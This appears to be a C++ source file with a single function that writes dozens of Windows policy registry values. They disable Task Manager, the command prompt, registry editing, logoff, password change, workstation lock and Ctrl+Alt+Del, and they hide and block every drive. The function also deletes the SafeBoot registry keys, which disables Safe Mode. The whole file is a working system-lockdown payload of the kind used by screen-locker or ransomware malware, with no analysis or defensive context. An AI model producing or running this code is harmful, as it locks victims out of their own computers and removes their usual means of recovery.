
#include "RegEditor.h"

void ModifyRegistry()
{

RegEditor a;

int Value=1;
a.WriteReg(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","DisableTaskMgr",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"SOFTWARE\\Policies\\Microsoft\\Windows\\System", "DisableCMD",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "Restrictrun",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "DisallowRun",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoLogOff",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoRealMode",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoDesktop",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoToolbarsOnTaskbar",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoRecentDocsMenu",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoRecentDocsHistory",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "ClearRecentDocsOnExit",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoFavoritesMenu",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoSMHelp",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoFind",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoRun",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoLogOff",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "StartMenuLogOff",REG_DWORD,(LPBYTE)&Value,sizeof(Value)); 
a.WriteReg(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoClose",REG_DWORD,(LPBYTE)&Value,sizeof(Value)); 
a.WriteReg(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoSetFolders",REG_DWORD,(LPBYTE)&Value,sizeof(Value)); 
a.WriteReg(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoSetTaskbar",REG_DWORD,(LPBYTE)&Value,sizeof(Value)); 
a.WriteReg(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoFolderOptions",REG_DWORD,(LPBYTE)&Value,sizeof(Value)); 
a.WriteReg(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoSetActiveDesktop",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoActiveDesktop",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoActiveDesktopChanges",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Group Policy Objects\\{E17D3D3D-5177-4A36-BA37-191320CC5240}User\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoLogoff",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Group Policy Objects\\{E17D3D3D-5177-4A36-BA37-191320CC5240}User\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableChangePassword",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableChangePassword",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableLockWorkstation",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Group Policy Objects\\{E17D3D3D-5177-4A36-BA37-191320CC5240}User\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "StartMenuLogOff",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Group Policy Objects\\{E17D3D3D-5177-4A36-BA37-191320CC5240}User\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "HideFastUserSwitching",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableSwitchUserOption",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "NoConfigPage",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "NoDevMgrPage",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"Software\\Policies\\Microsoft\\MMC\\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}", "Restrict_Run",REG_DWORD,(LPBYTE)&Value,sizeof(Value));

a.WriteReg(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableCAD",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableLockWorkstation",REG_DWORD,(LPBYTE)&Value,sizeof(Value));

Value=0xffffffff;
a.WriteReg(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoDrives",REG_DWORD,(LPBYTE)&Value,sizeof(Value));
a.WriteReg(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoViewOnDrive",REG_DWORD,(LPBYTE)&Value,sizeof(Value));


a.DeleteReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\SafeBoot","Minimal");
a.DeleteReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\SafeBoot","Network");

return;
}